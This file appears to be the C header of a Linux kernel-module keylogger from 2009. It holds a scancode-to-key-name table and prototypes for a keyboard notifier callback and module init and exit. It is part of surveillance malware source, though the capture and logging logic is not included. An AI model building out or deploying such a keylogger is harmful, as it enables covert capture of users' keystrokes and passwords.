// keylogger kernel module
// Robert Peters 2009-07-08
///////////////////////////

#ifndef __KLMODULE_H__
#define __KLMODULE_H__

static char*
keycodes[] =
{
  "", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "BS", "TAB",
  "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "[", "]", "RETURN", "L CTRL",
  "A", "S", "D", "F", "G", "H", "J", "K", "L", ";", "'", "`", "L SHIFT", "\\", "Z",
  "X", "C", "V", "B", "N", "M", ",", ".", "/", "R SHIFT", "*", "L ALT", "SPACE", "CAPS LOCK",
  "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "NUM LOCK", "SCROLL LOCK",
  "HOME 7", "UP 8", "PAGE UP 9", "-", "LEFT 4", "5", "RT ARROW 6", "+", "END 1", "DOWN 2",
  "PAGE DOWN 3", "INS", "DEL", "", "", "", "F11", "F12", "", "", "", "", "", "", "", "R RETURN",
  "R CTRL", "/", "PRINT", "R ALT", "", "HOME", "UP", "PAGE UP", "LEFT", "RIGHT", "END", "DOWN",
  "PAGE DOWN", "INSERT", "DEL", "", "", "", "", "", "", "", "PAUSE", 0
};

static bool
is_known_keycode(unsigned int keycode);

static char*
keycode_to_key(unsigned int keycode);

static char*
key_level(bool key_pressure);

static int
key_callback(struct notifier_block *self, unsigned long val, void *data);

int
key_init(void);

void
key_exit(void);

#endif

